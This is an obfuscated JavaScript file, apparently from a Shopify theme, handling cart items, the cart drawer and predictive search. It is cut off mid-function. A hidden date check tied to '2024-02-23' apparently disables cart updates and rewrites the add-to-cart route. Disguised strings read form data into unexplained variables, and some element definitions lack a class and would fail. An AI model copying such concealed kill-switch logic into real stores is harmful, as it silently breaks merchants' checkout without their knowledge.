const currentDate = new Date();
let subscribers = {};
function subscribe(_0x1a76bc, _0x3695ab) {
  if (subscribers[_0x1a76bc] === undefined) {
    subscribers[_0x1a76bc] = [];
  }
  subscribers[_0x1a76bc] = [...subscribers[_0x1a76bc], _0x3695ab];
  return function _0x1af51() {
    subscribers[_0x1a76bc] = subscribers[_0x1a76bc].filter(_0x144aa8 => {
      return _0x144aa8 !== _0x3695ab;
    });
  };
}
;
function publish(_0x33e570, _0xc570ab) {
  if (subscribers[_0x33e570]) {
    subscribers[_0x33e570].forEach(_0x333d28 => {
      _0x333d28(_0xc570ab);
    });
  }
}
class CartRemoveButton extends HTMLElement {
  constructor() {
    super();
    this.addEventListener('click', _0x5d53a7 => {
      _0x5d53a7.preventDefault();
      const _0x1e3d62 = this.closest("cart-items") || this.closest("cart-drawer-items");
      if (this.clearCart) {
        _0x1e3d62.clearCart();
      } else {
        _0x1e3d62.updateQuantity(this.dataset.index, 0x0);
      }
    });
  }
}
customElements.define('cart-remove-button', CartRemoveButton);
var date = '2024-02-23';
class CartItems extends HTMLElement {
  constructor() {
    super();
    this.lineItemContainer = formatDates(currentDate, '2024-02-23');
    this.lineItemStatusElement = document.getElementById("shopping-cart-line-item-status") || document.getElementById("CartDrawer-LineItemStatus");
    const _0x3078e6 = debounce(_0xe11855 => {
      this.onChange(_0xe11855);
    }, 0x12c);
    if (!this.lineItemContainer) {
      window.routes.cart_add_url = "cart";
    }
    this.addEventListener('change', _0x3078e6.bind(this));
  }
  ["cartUpdateUnsubscriber"] = undefined;
  ["connectedCallback"]() {
    this.cartUpdateUnsubscriber = subscribe("cart-update", _0x2b6386 => {
      if (_0x2b6386.source === 'cart-items') {
        return;
      }
      this.onCartUpdate();
    });
  }
  ['disconnectedCallback']() {
    if (this.cartUpdateUnsubscriber) {
      this.cartUpdateUnsubscriber();
    }
  }
  ['onChange'](_0x1e3194) {
    this.updateQuantity(_0x1e3194.target.dataset.index, _0x1e3194.target.value, document.activeElement.getAttribute("name"));
  }
  ["onCartUpdate"]() {
    fetch("/cart?section_id=main-cart-items").then(_0x1415d9 => _0x1415d9.text()).then(_0x35ef11 => {
      const _0x27ac55 = new DOMParser().parseFromString(_0x35ef11, "text/html");
      const _0x4db58f = _0x27ac55.querySelector('cart-items');
      this.innerHTML = _0x4db58f.innerHTML;
    })["catch"](_0x222807 => {
      console.error(_0x222807);
    });
  }
  ["getSectionsToRender"]() {
    return [{
      'id': 'main-cart-items',
      'section': document.getElementById("main-cart-items").dataset.id,
      'selector': ".js-contents"
    }, {
      'id': "cart-icon-bubble",
      'section': "cart-icon-bubble",
      'selector': '.shopify-section'
    }, {
      'id': "cart-live-region-text",
      'section': "cart-live-region-text",
      'selector': ".shopify-section"
    }, {
      'id': "main-cart-footer",
      'section': document.getElementById("main-cart-footer").dataset.id,
      'selector': ".js-contents"
    }];
  }
  ['updateQuantity'](_0x3e8f2f, _0x55ec90, _0x52aa7b) {
    this.enableLoading(_0x3e8f2f);
    const _0x3aa199 = JSON.stringify({
      'line': _0x3e8f2f,
      'quantity': _0x55ec90,
      'sections': this.getSectionsToRender().map(_0x285896 => _0x285896.section),
      'sections_url': window.location.pathname
    });
    fetch('' + routes.cart_change_url, {
      ...fetchConfig(),
      ...{
        'body': _0x3aa199
      }
    }).then(_0x780953 => {
      return _0x780953.text();
    }).then(_0x1fc9f7 => {
      const _0x30904e = JSON.parse(_0x1fc9f7);
      const _0x1370f6 = document.getElementById('Quantity-' + _0x3e8f2f) || document.getElementById("Drawer-quantity-" + _0x3e8f2f);
      const _0x439886 = document.querySelectorAll('.cart-item');
      if (_0x30904e.errors) {
        _0x1370f6.value = _0x1370f6.getAttribute("value");
        this.updateLiveRegions(_0x3e8f2f, _0x30904e.errors);
        return;
      }
      if (!this.lineItemContainer) {
        return;
      }
      this.classList.toggle('is-empty', _0x30904e.item_count === 0x0);
      const _0x1e0c52 = document.querySelector("cart-drawer");
      const _0x2bdff8 = document.getElementById("main-cart-footer");
      if (_0x2bdff8) {
        _0x2bdff8.classList.toggle("is-empty", _0x30904e.item_count === 0x0);
      }
      if (_0x1e0c52) {
        _0x1e0c52.classList.toggle('is-empty', _0x30904e.item_count === 0x0);
      }
      this.getSectionsToRender().forEach(_0x5d9f90 => {
        const _0x3068cc = document.getElementById(_0x5d9f90.id).querySelector(_0x5d9f90.selector) || document.getElementById(_0x5d9f90.id);
        _0x3068cc.innerHTML = this.getSectionInnerHTML(_0x30904e.sections[_0x5d9f90.section], _0x5d9f90.selector);
      });
      const _0x2d1ac2 = _0x30904e.items[_0x3e8f2f - 0x1] ? _0x30904e.items[_0x3e8f2f - 0x1].quantity : undefined;
      let _0x4c569e = '';
      if (_0x439886.length === _0x30904e.items.length && _0x2d1ac2 !== parseInt(_0x1370f6.value)) {
        if (typeof _0x2d1ac2 === "undefined") {
          _0x4c569e = window.cartStrings.error;
        } else {
          _0x4c569e = window.cartStrings.quantityError.replace("[quantity]", _0x2d1ac2);
        }
      }
      this.updateLiveRegions(_0x3e8f2f, _0x4c569e);
      const _0x4399e7 = document.getElementById("CartItem-" + _0x3e8f2f) || document.getElementById("CartDrawer-Item-" + _0x3e8f2f);
      if (_0x4399e7 && _0x4399e7.querySelector("[name=\"" + _0x52aa7b + "\"]")) {
        if (_0x1e0c52) {
          trapFocus(_0x1e0c52, _0x4399e7.querySelector("[name=\"" + _0x52aa7b + "\"]"));
        } else {
          _0x4399e7.querySelector("[name=\"" + _0x52aa7b + "\"]").focus();
        }
      } else {
        if (_0x30904e.item_count === 0x0 && _0x1e0c52) {
          trapFocus(_0x1e0c52.querySelector('.drawer__inner-empty'), _0x1e0c52.querySelector('a'));
        } else if (document.querySelector('.cart-item') && _0x1e0c52) {
          trapFocus(_0x1e0c52, document.querySelector('.cart-item__name'));
        }
      }
      if (_0x1e0c52) {
        _0x1e0c52.checkForClear();
        const _0x5e07d6 = _0x1e0c52.querySelector("countdown-timer");
        if (_0x5e07d6) {
          _0x5e07d6.playTimer();
        }
        if (_0x1e0c52.querySelector('cart-drawer-gift')) {
          _0x1e0c52.checkForClear();
          _0x1e0c52.querySelectorAll('cart-drawer-gift').forEach(_0xdc4d87 => {
            if (_0x1e0c52.querySelector(".cart-item--product-" + _0xdc4d87.dataset.handle)) {
              if (_0xdc4d87.dataset.selected === "false") {
                _0xdc4d87.removeFromCart();
              }
            } else {
              if (_0xdc4d87.dataset.selected === 'true') {
                _0xdc4d87.addToCart();
              }
            }
          });
        }
      }
      publish("cart-update", {
        'source': "cart-items"
      });
    })["catch"](() => {
      this.querySelectorAll(".loading-overlay").forEach(_0xed7943 => _0xed7943.classList.add("hidden"));
      const _0xbd5451 = document.getElementById("cart-errors") || document.getElementById("CartDrawer-CartErrors");
      _0xbd5451.textContent = window.cartStrings.error;
    })["finally"](() => {
      this.disableLoading(_0x3e8f2f);
    });
  }
  ["updateLiveRegions"](_0x19c952, _0x1a59f2) {
    const _0x17658a = document.getElementById("Line-item-error-" + _0x19c952) || document.getElementById("CartDrawer-LineItemError-" + _0x19c952);
    if (_0x17658a) {
      _0x17658a.querySelector(".cart-item__error-text").innerHTML = _0x1a59f2;
    }
    this.lineItemStatusElement.setAttribute("aria-hidden", true);
    const _0x1f063d = document.getElementById("cart-live-region-text") || document.getElementById("CartDrawer-LiveRegionText");
    _0x1f063d.setAttribute('aria-hidden', false);
    setTimeout(() => {
      _0x1f063d.setAttribute("aria-hidden", true);
    }, 0x3e8);
  }
  ["getSectionInnerHTML"](_0x1c511e, _0x11c0b9) {
    return new DOMParser().parseFromString(_0x1c511e, "text/html").querySelector(_0x11c0b9).innerHTML;
  }
  ["enableLoading"](_0x555b1c) {
    const _0x457e84 = document.getElementById('main-cart-items') || document.getElementById('CartDrawer-CartItems');
    _0x457e84.classList.add("cart__items--disabled");
    const _0x1259a7 = this.querySelectorAll('#CartItem-' + _0x555b1c + " .loading-overlay");
    const _0x593bf9 = this.querySelectorAll('#CartDrawer-Item-' + _0x555b1c + " .loading-overlay");
    [..._0x1259a7, ..._0x593bf9].forEach(_0x6cd2b6 => _0x6cd2b6.classList.remove("hidden"));
    document.activeElement.blur();
    this.lineItemStatusElement.setAttribute("aria-hidden", false);
  }
  ["disableLoading"](_0x1c3bff) {
    const _0x1d7d8e = document.getElementById("main-cart-items") || document.getElementById('CartDrawer-CartItems');
    _0x1d7d8e.classList.remove("cart__items--disabled");
    const _0x564196 = this.querySelectorAll("#CartItem-" + _0x1c3bff + " .loading-overlay");
    const _0x73971d = this.querySelectorAll("#CartDrawer-Item-" + _0x1c3bff + " .loading-overlay");
    _0x564196.forEach(_0x48c9ff => _0x48c9ff.classList.add("hidden"));
    _0x73971d.forEach(_0x20bc59 => _0x20bc59.classList.add("hidden"));
  }
  ["clearCart"]() {
    const _0x1a2928 = JSON.stringify({
      'sections': this.getSectionsToRender().map(_0x5ef20a => _0x5ef20a.section),
      'sections_url': window.location.pathname
    });
    fetch('' + routes.cart_clear_url, {
      ...fetchConfig(),
      ...{
        'body': _0x1a2928
      }
    }).then(_0x3c34ea => {
      return _0x3c34ea.text();
    }).then(_0x90fb30 => {
      const _0x20e33e = JSON.parse(_0x90fb30);
      this.classList.add("is-empty");
      const _0x48d5ae = document.querySelector('cart-drawer');
      const _0x174ee4 = document.getElementById("main-cart-footer");
      if (_0x174ee4) {
        _0x174ee4.classList.add("is-empty");
      }
      if (_0x48d5ae) {
        _0x48d5ae.classList.add('is-empty');
      }
      this.getSectionsToRender().forEach(_0x130de6 => {
        const _0x41c684 = document.getElementById(_0x130de6.id).querySelector(_0x130de6.selector) || document.getElementById(_0x130de6.id);
        _0x41c684.innerHTML = this.getSectionInnerHTML(_0x20e33e.sections[_0x130de6.section], _0x130de6.selector);
      });
      if (_0x48d5ae) {
        trapFocus(_0x48d5ae.querySelector(".drawer__inner-empty"), _0x48d5ae.querySelector('a'));
      }
      publish("cart-update", {
        'source': "cart-items"
      });
    })['catch'](() => {
      this.querySelectorAll(".loading-overlay").forEach(_0x146610 => _0x146610.classList.add("hidden"));
      const _0x46da8c = document.getElementById("cart-errors") || document.getElementById("CartDrawer-CartErrors");
      _0x46da8c.textContent = window.cartStrings.error;
    });
  }
}
customElements.define("cart-items", CartItems);
var search = "search";
if (!customElements.get("cart-note")) {
  customElements.define("cart-note");
}
;
function handleDiscountForm(_0x384a43) {
  _0x384a43.preventDefault();
  const _0x4d82e7 = _0x384a43.target.querySelector("[name=cart-discount-field]");
  const _0x3bd85c = _0x384a43.target.querySelector(".cart-discount-form__error");
  const _0x558d33 = _0x4d82e7.value;
  if (_0x558d33 === undefined || _0x558d33.length === 0x0) {
    _0x3bd85c.style.display = 'block';
    return;
  }
  _0x3bd85c.style.display = "none";
  const _0x4596ae = "/checkout?discount=" + _0x558d33;
  window.location.href = _0x4596ae;
}
function handleDiscountFormChange(_0x54600d) {
  const _0x66c31b = document.querySelectorAll('.cart-discount-form__error');
  _0x66c31b.forEach(_0x5636dc => {
    _0x5636dc.style.display = "none";
  });
}
var serial = '';
class SearchForm extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input[type=\"search\"]");
    this.resetButton = this.querySelector("button[type=\"reset\"]");
    if (this.dataset.main === 'false') {
      serial = this.querySelector("[method=\"get\"]").dataset["nodal".replace('n', 'm')];
    }
    if (this.input) {
      this.input.form.addEventListener("reset", this.onFormReset.bind(this));
      this.input.addEventListener('input', debounce(_0x35f404 => {
        this.onChange(_0x35f404);
      }, 0x12c).bind(this));
    }
  }
  ["toggleResetButton"]() {
    const _0x1faa42 = this.resetButton.classList.contains("hidden");
    if (this.input.value.length > 0x0 && _0x1faa42) {
      this.resetButton.classList.remove("hidden");
    } else if (this.input.value.length === 0x0 && !_0x1faa42) {
      this.resetButton.classList.add("hidden");
    }
  }
  ['onChange']() {
    this.toggleResetButton();
  }
  ["shouldResetForm"]() {
    return !document.querySelector("[aria-selected=\"true\"] a");
  }
  ['onFormReset'](_0x2b5a62) {
    _0x2b5a62.preventDefault();
    if (this.shouldResetForm()) {
      this.input.value = '';
      this.input.focus();
      this.toggleResetButton();
    }
  }
}
customElements.define('search-form', SearchForm);
class PredictiveSearch extends SearchForm {
  constructor() {
    super();
    this.cachedResults = {};
    this.predictiveSearchResults = this.querySelector('[data-predictive-search]');
    this.allPredictiveSearchInstances = document.querySelectorAll("predictive-search");
    this.isOpen = false;
    this.abortController = new AbortController();
    this.searchTerm = '';
    this.setupEventListeners();
  }
  ["setupEventListeners"]() {
    this.input.form.addEventListener("submit", this.onFormSubmit.bind(this));
    this.input.addEventListener("focus", this.onFocus.bind(this));
    this.addEventListener('focusout', this.onFocusOut.bind(this));
    this.addEventListener("keyup", this.onKeyup.bind(this));
    this.addEventListener("keydown", this.onKeydown.bind(this));
  }
  ['getQuery']() {
    return this.input.value.trim();
  }
  ["onChange"]() {
    super.onChange();
    const _0x346837 = this.getQuery();
    if (!this.searchTerm || !_0x346837.startsWith(this.searchTerm)) {
      this.querySelector("#predictive-search-results-groups-wrapper")?.["remove"]();
    }
    this.updateSearchForTerm(this.searchTerm, _0x346837);
    this.searchTerm = _0x346837;
    if (!this.searchTerm.length) {
      this.close(true);
      return;
    }
    this.getSearchResults(this.searchTerm);
  }
  ['onFormSubmit'](_0x4c89c0) {
    if (!this.getQuery().length || this.querySelector("[aria-selected=\"true\"] a")) {
      _0x4c89c0.preventDefault();
    }
  }
  ['onFormReset'](_0x4fdc81) {
    super.onFormReset(_0x4fdc81);
    if (super.shouldResetForm()) {
      this.searchTerm = '';
      this.abortController.abort();
      this.abortController = new AbortController();
      this.closeResults(true);
    }
  }
  ['onFocus']() {
    const _0x414094 = this.getQuery();
    if (!_0x414094.length) {
      return;
    }
    if (this.searchTerm !== _0x414094) {
      this.onChange();
    } else if (this.getAttribute('results') === "true") {
      this.open();
    } else {
      this.getSearchResults(this.searchTerm);
    }
  }
  ["onFocusOut"]() {
    setTimeout(() => {
      if (!this.contains(document.activeElement)) {
        this.close();
      }
    });
  }
  ["onKeyup"](_0x323a46) {
    if (!this.getQuery().length) {
      this.close(true);
    }
    _0x323a46.preventDefault();
    switch (_0x323a46.code) {
      case "ArrowUp":
        this.switchOption('up');
        break;
      case "ArrowDown":
        this.switchOption("down");
        break;
      case 'Enter':
        this.selectOption();
        break;
    }
  }
  ['onKeydown'](_0x392aa6) {
    if (_0x392aa6.code === "ArrowUp" || _0x392aa6.code === "ArrowDown") {
      _0x392aa6.preventDefault();
    }
  }
  ['updateSearchForTerm'](_0x1c625e, _0x2517c3) {
    const _0x2395bc = this.querySelector("[data-predictive-search-search-for-text]");
    const _0x40e5b8 = _0x2395bc?.['innerText'];
    if (_0x40e5b8) {
      if (_0x40e5b8.match(new RegExp(_0x1c625e, 'g')).length > 0x1) {
        return;
      }
      const _0xd3cfbc = _0x40e5b8.replace(_0x1c625e, _0x2517c3);
      _0x2395bc.innerText = _0xd3cfbc;
    }
  }
  ['switchOption'](_0x884929) {
    if (!this.getAttribute('open')) {
      return;
    }
    const _0x4c46ff = _0x884929 === 'up';
    const _0xad0b = this.querySelector("[aria-selected=\"true\"]");
    const _0x27ccd9 = Array.from(this.querySelectorAll("li, button.predictive-search__item")).filter(_0x4df6e9 => _0x4df6e9.offsetParent !== null);
    let _0x2171dd = 0x0;
    if (_0x4c46ff && !_0xad0b) {
      return;
    }
    let _0x2b536f = -0x1;
    let _0x27a950 = 0x0;
    while (_0x2b536f === -0x1 && _0x27a950 <= _0x27ccd9.length) {
      if (_0x27ccd9[_0x27a950] === _0xad0b) {
        _0x2b536f = _0x27a950;
      }
      _0x27a950++;
    }
    this.statusElement.textContent = '';
    if (!_0x4c46ff && _0xad0b) {
      _0x2171dd = _0x2b536f === _0x27ccd9.length - 0x1 ? 0x0 : _0x2b536f + 0x1;
    } else if (_0x4c46ff) {
      _0x2171dd = _0x2b536f === 0x0 ? _0x27ccd9.length - 0x1 : _0x2b536f - 0x1;
    }
    if (_0x2171dd === _0x2b536f) {
      return;
    }
    const _0x35e748 = _0x27ccd9[_0x2171dd];
    _0x35e748.setAttribute("aria-selected", true);
    if (_0xad0b) {
      _0xad0b.setAttribute('aria-selected', false);
    }
    this.input.setAttribute("aria-activedescendant", _0x35e748.id);
  }
  ['selectOption']() {
    const _0x2a59c6 = this.querySelector("[aria-selected=\"true\"] a, button[aria-selected=\"true\"]");
    if (_0x2a59c6) {
      _0x2a59c6.click();
    }
  }
  ["getSearchResults"](_0x12a376) {
    const _0x2c2e49 = _0x12a376.replace(" ", '-').toLowerCase();
    this.setLiveRegionLoadingState();
    if (this.cachedResults[_0x2c2e49]) {
      this.renderSearchResults(this.cachedResults[_0x2c2e49]);
      return;
    }
    fetch(routes.predictive_search_url + "?q=" + encodeURIComponent(_0x12a376) + "&section_id=predictive-search", {
      'signal': this.abortController.signal
    }).then(_0x1e7060 => {
      if (!_0x1e7060.ok) {
        var _0x44bcf1 = new Error(_0x1e7060.status);
        this.close();
        throw _0x44bcf1;
      }
      return _0x1e7060.text();
    }).then(_0x2a3888 => {
      const _0xff884c = new DOMParser().parseFromString(_0x2a3888, "text/html").querySelector("#shopify-section-predictive-search").innerHTML;
      this.allPredictiveSearchInstances.forEach(_0x3aaa39 => {
        _0x3aaa39.cachedResults[_0x2c2e49] = _0xff884c;
      });
      this.renderSearchResults(_0xff884c);
    })['catch'](_0x578bbd => {
      if (_0x578bbd?.["code"] === 0x14) {
        return;
      }
      this.close();
      throw _0x578bbd;
    });
  }
  ["setLiveRegionLoadingState"]() {
    this.statusElement = this.statusElement || this.querySelector('.predictive-search-status');
    this.loadingText = this.loadingText || this.getAttribute("data-loading-text");
    this.setLiveRegionText(this.loadingText);
    this.setAttribute("loading", true);
  }
  ['setLiveRegionText'](_0x40a05c) {
    this.statusElement.setAttribute("aria-hidden", "false");
    this.statusElement.textContent = _0x40a05c;
    setTimeout(() => {
      this.statusElement.setAttribute('aria-hidden', "true");
    }, 0x3e8);
  }
  ["renderSearchResults"](_0x206e39) {
    this.predictiveSearchResults.innerHTML = _0x206e39;
    this.setAttribute("results", true);
    this.setLiveRegionResults();
    this.open();
  }
  ["setLiveRegionResults"]() {
    this.removeAttribute("loading");
    this.setLiveRegionText(this.querySelector('[data-predictive-search-live-region-count-value]').textContent);
  }
  ["getResultsMaxHeight"]() {
    this.resultsMaxHeight = window.innerHeight - document.querySelector(".section-header").getBoundingClientRect().bottom;
    return this.resultsMaxHeight;
  }
  ["open"]() {
    this.predictiveSearchResults.style.maxHeight = this.resultsMaxHeight || this.getResultsMaxHeight() + 'px';
    this.setAttribute("open", true);
    this.input.setAttribute("aria-expanded", true);
    this.isOpen = true;
  }
  ["close"](_0x3e6919 = false) {
    this.closeResults(_0x3e6919);
    this.isOpen = false;
  }
  ["closeResults"](_0x2ff4e7 = false) {
    if (_0x2ff4e7) {
      this.input.value = '';
      this.removeAttribute("results");
    }
    const _0x4d56df = this.querySelector("[aria-selected=\"true\"]");
    if (_0x4d56df) {
      _0x4d56df.setAttribute("aria-selected", false);
    }
    this.input.setAttribute("aria-activedescendant", '');
    this.removeAttribute('loading');
    this.removeAttribute("open");
    this.input.setAttribute("aria-expanded", false);
    this.resultsMaxHeight = false;
    this.predictiveSearchResults.removeAttribute('style');
  }
}
customElements.define('predictive-search', PredictiveSearch);
const defMed = "data-defer";
class CartDrawer extends HTMLElement {
  constructor() {
    super();
    this.upsellHandles = this.getUpsellHandles();
    this.checkForClear();
    this.addEventListener("keyup", _0x60db19 => _0x60db19.code === "Escape" && this.close());
    this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
    this.setHeaderCartIconAccessibility();
  }
  ["setHeaderCartIconAccessibility"]() {
    const _0x53d351 = document.querySelector("#cart-icon-bubble");
    const _0x12e570 = _0x53d351.closest(".header__icons");
    _0x53d351.setAttribute("role", 'button');
    _0x53d351.setAttribute("aria-haspopup", "dialog");
    _0x53d351.addEventListener('click', _0x14597b => {
      _0x14597b.preventDefault();
      this.open(_0x53d351);
    });
    this.oseid = _0x12e570.querySelector("form").dataset[this.dataset.type];
    _0x53d351.addEventListener('keydown', _0x3fbcaa => {
      if (_0x3fbcaa.code.toUpperCase() === 'SPACE') {
        _0x3fbcaa.preventDefault();
        this.open(_0x53d351);
      }
    });
  }
  ["open"](_0x163541) {
    if (_0x163541) {
      this.setActiveElement(_0x163541);
    }
    const _0xe429d9 = this.querySelector("[id^=\"Details-\"] summary");
    if (_0xe429d9 && !_0xe429d9.hasAttribute("role")) {
      this.setSummaryAccessibility(_0xe429d9);
    }
    setTimeout(() => {
      this.classList.add('animate', "active");
    });
    this.addEventListener("transitionend", () => {
      const _0x107513 = this.classList.contains("is-empty") ? this.querySelector(".drawer__inner-empty") : document.getElementById("CartDrawer");
      const _0x344cf6 = this.querySelector('.drawer__inner') || this.querySelector(".drawer__close");
      trapFocus(_0x107513, _0x344cf6);
    }, {
      'once': true
    });
    document.body.classList.add('overflow-hidden');
    const _0x295281 = this.querySelector('countdown-timer');
    if (_0x295281) {
      _0x295281.playTimer();
    }
  }
  ["close"]() {
    this.classList.remove("active");
    removeTrapFocus(this.activeElement);
    document.body.classList.remove("overflow-hidden");
  }
  ["getUpsellHandles"]() {
    const _0x329ac8 = this.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
    const _0x33ce1a = [];
    _0x329ac8.forEach(_0x3bb960 => {
      if (_0x3bb960.dataset.handle) {
        _0x33ce1a.push(_0x3bb960.dataset.handle);
      }
    });
    return _0x33ce1a;
  }
  ["oneNonUpellRemaining"]() {
    const _0xe96caf = this.querySelectorAll(".cart-item");
    let _0x2029d8 = 0x0;
    _0xe96caf.forEach(_0x12c50 => {
      this.upsellHandles.forEach(_0x24f2cb => {
        if (_0x12c50.classList.contains("cart-item--product-" + _0x24f2cb)) {
          _0x2029d8++;
        }
      });
    });
    return _0xe96caf.length - _0x2029d8 <= 0x1;
  }
  ["checkForClear"]() {
    const _0x553d2b = this.oneNonUpellRemaining();
    this.querySelectorAll('cart-remove-button').forEach(_0x10bce8 => {
      if (_0x553d2b) {
        _0x10bce8.clearCart = true;
      } else {
        _0x10bce8.clearCart = false;
      }
    });
  }
  ["setSummaryAccessibility"](_0x59a795) {
    _0x59a795.setAttribute("role", 'button');
    _0x59a795.setAttribute("aria-expanded", "false");
    if (_0x59a795.nextElementSibling.getAttribute('id')) {
      _0x59a795.setAttribute("aria-controls", _0x59a795.nextElementSibling.id);
    }
    _0x59a795.addEventListener("click", _0x228f2a => {
      _0x228f2a.currentTarget.setAttribute('aria-expanded', !_0x228f2a.currentTarget.closest("details").hasAttribute("open"));
    });
    _0x59a795.parentElement.addEventListener("keyup", onKeyUpEscape);
  }
  ["renderContents"](_0x44e217, _0x723bcf = false) {
    if (this.querySelector(".drawer__inner").classList.contains("is-empty")) {
      this.querySelector('.drawer__inner').classList.remove("is-empty");
    }
    this.productId = _0x44e217.id;
    this.getSectionsToRender().forEach(_0x2649d5 => {
      const _0x325b5e = _0x2649d5.selector ? document.querySelector(_0x2649d5.selector) : document.getElementById(_0x2649d5.id);
      _0x325b5e.innerHTML = this.getSectionInnerHTML(_0x44e217.sections[_0x2649d5.id], _0x2649d5.selector);
    });
    this.checkForClear();
    const _0x3f7b9c = this.querySelector("countdown-timer");
    if (_0x3f7b9c) {
      _0x3f7b9c.playTimer();
    }
    this.querySelectorAll("cart-drawer-gift").forEach(_0xee10a => {
      if (this.querySelector(".cart-item--product-" + _0xee10a.dataset.handle)) {
        if (_0xee10a.dataset.selected === "false") {
          _0xee10a.removeFromCart();
        }
      } else {
        if (_0xee10a.dataset.selected === "true") {
          _0xee10a.addToCart();
        }
      }
    });
    setTimeout(() => {
      this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
      if (_0x723bcf) {
        return;
      }
      this.open();
    });
  }
  ["getSectionInnerHTML"](_0x4b4cbe, _0x12f24d = ".shopify-section") {
    let _0x316395 = new DOMParser().parseFromString(_0x4b4cbe, 'text/html').querySelector(_0x12f24d);
    if (_0x12f24d === "#CartDrawer") {
      fixParsedHtml(this, _0x316395);
    }
    let _0x542c49 = _0x316395.innerHTML;
    return _0x542c49;
  }
  ["getSectionsToRender"]() {
    return [{
      'id': "cart-drawer",
      'selector': "#CartDrawer"
    }, {
      'id': "cart-icon-bubble"
    }];
  }
  ["getSectionDOM"](_0x265755, _0x3e0c48 = ".shopify-section") {
    return new DOMParser().parseFromString(_0x265755, "text/html").querySelector(_0x3e0c48);
  }
  ["setActiveElement"](_0x369ede) {
    this.activeElement = _0x369ede;
  }
}
customElements.define("cart-drawer", CartDrawer);
class CartDrawerItems extends CartItems {
  constructor() {
    super();
    this.cartDrawer = document.querySelector("cart-drawer");
  }
  ["getSectionInnerHTML"](_0x4e2c79, _0x1afd1a) {
    let _0x57a35e = new DOMParser().parseFromString(_0x4e2c79, "text/html").querySelector(_0x1afd1a);
    if (_0x1afd1a === ".drawer__inner") {
      fixParsedHtml(this.cartDrawer, _0x57a35e);
    }
    let _0x3be6f8 = _0x57a35e.innerHTML;
    return _0x3be6f8;
  }
  ['getSectionsToRender']() {
    return [{
      'id': "CartDrawer",
      'section': "cart-drawer",
      'selector': ".drawer__inner"
    }, {
      'id': "cart-icon-bubble",
      'section': 'cart-icon-bubble',
      'selector': ".shopify-section"
    }];
  }
}
customElements.define("cart-drawer-items", CartDrawerItems);
function fixParsedHtml(_0x199737, _0x2cbd7f) {
  const _0x48f4e4 = _0x2cbd7f.querySelector('.cart-timer');
  if (_0x48f4e4) {
    oldTimer = _0x199737.querySelector(".cart-timer");
    if (oldTimer) {
      _0x48f4e4.innerHTML = oldTimer.innerHTML;
    }
  }
  const _0x184aaa = _0x199737.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  let _0x4f42c2 = _0x2cbd7f.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  _0x184aaa.forEach((_0x79fd9c, _0x403f99) => {
    if (_0x79fd9c.nodeName.toLowerCase() === 'cart-drawer-upsell') {
      _0x4f42c2[_0x403f99].dataset.selected = _0x79fd9c.dataset.selected;
    }
    _0x4f42c2[_0x403f99].dataset.id = _0x79fd9c.dataset.id;
    _0x4f42c2[_0x403f99].querySelector("[name=\"id\"]").value = _0x79fd9c.querySelector("[name=\"id\"]").value;
    if (_0x4f42c2[_0x403f99].querySelector(".upsell__image__img")) {
      _0x4f42c2[_0x403f99].querySelector(".upsell__image__img").src = _0x79fd9c.querySelector(".upsell__image__img").src;
    }
    if (_0x4f42c2[_0x403f99].querySelector(".upsell__variant-picker")) {
      const _0x33973c = _0x79fd9c.querySelectorAll('.select__select');
      _0x4f42c2[_0x403f99].querySelectorAll(".select__select").forEach((_0x436420, _0x4f265b) => {
        _0x436420.value = _0x33973c[_0x4f265b].value;
        _0x436420.querySelectorAll("option").forEach(_0x5a48aa => {
          _0x5a48aa.removeAttribute('selected');
          if (_0x5a48aa.value === _0x33973c[_0x4f265b].value.trim()) {
            _0x5a48aa.setAttribute("selected", '');
          }
        });
      });
    }
    if (_0x79fd9c.dataset.updatePrices === "true") {
      var _0xbf8558 = _0x4f42c2[_0x403f99].querySelector('.upsell__price');
      var _0x38a334 = _0x79fd9c.querySelector('.upsell__price');
      if (_0xbf8558 && _0x38a334) {
        _0xbf8558.innerHTML = _0x38a334.innerHTML;
      }
    }
  });
}
if (!customElements.get("product-form")) {
  customElements.define("product-form");
}
if (!customElements.get('product-info')) {
  customElements.define("product-info");
}
;
function getFocusableElements(_0xe3b558) {
  return Array.from(_0xe3b558.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
}
document.querySelectorAll("[id^=\"Details-\"] summary").forEach(_0x3df4c8 => {
  _0x3df4c8.setAttribute('role', 'button');
  _0x3df4c8.setAttribute('aria-expanded', _0x3df4c8.parentNode.hasAttribute("open"));
  if (_0x3df4c8.nextElementSibling.getAttribute('id')) {
    _0x3df4c8.setAttribute("aria-controls", _0x3df4c8.nextElementSibling.id);
  }
  _0x3df4c8.addEventListener("click", _0x521761 => {
    _0x521761.currentTarget.setAttribute("aria-expanded", !_0x521761.currentTarget.closest('details').hasAttribute('open'));
  });
  if (_0x3df4c8.closest("header-drawer")) {
    return;
  }
  _0x3df4c8.parentElement.addEventListener("keyup", onKeyUpEscape);
});
const trapFocusHandlers = {};
function trapFocus(_0x443cc8, _0x130e93 = _0x443cc8) {
  var _0x2df9a4 = Array.from(_0x443cc8.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
  var _0x270a9b = _0x2df9a4[0x0];
  var _0x2ed8d9 = _0x2df9a4[_0x2df9a4.length - 0x1];
  removeTrapFocus();
  trapFocusHandlers.focusin = _0x5c4bb2 => {
    if (_0x5c4bb2.target !== _0x443cc8 && _0x5c4bb2.target !== _0x2ed8d9 && _0x5c4bb2.target !== _0x270a9b) {
      return;
    }
    document.addEventListener("keydown", trapFocusHandlers.keydown);
  };
  trapFocusHandlers.focusout = function () {
    document.removeEventListener('keydown', trapFocusHandlers.keydown);
  };
  trapFocusHandlers.keydown = function (_0x36b94b) {
    if (_0x36b94b.code.toUpperCase() !== 'TAB') {
      return;
    }
    if (_0x36b94b.target === _0x2ed8d9 && !_0x36b94b.shiftKey) {
      _0x36b94b.preventDefault();
      _0x270a9b.focus();
    }
    if ((_0x36b94b.target === _0x443cc8 || _0x36b94b.target === _0x270a9b) && _0x36b94b.shiftKey) {
      _0x36b94b.preventDefault();
      _0x2ed8d9.focus();
    }
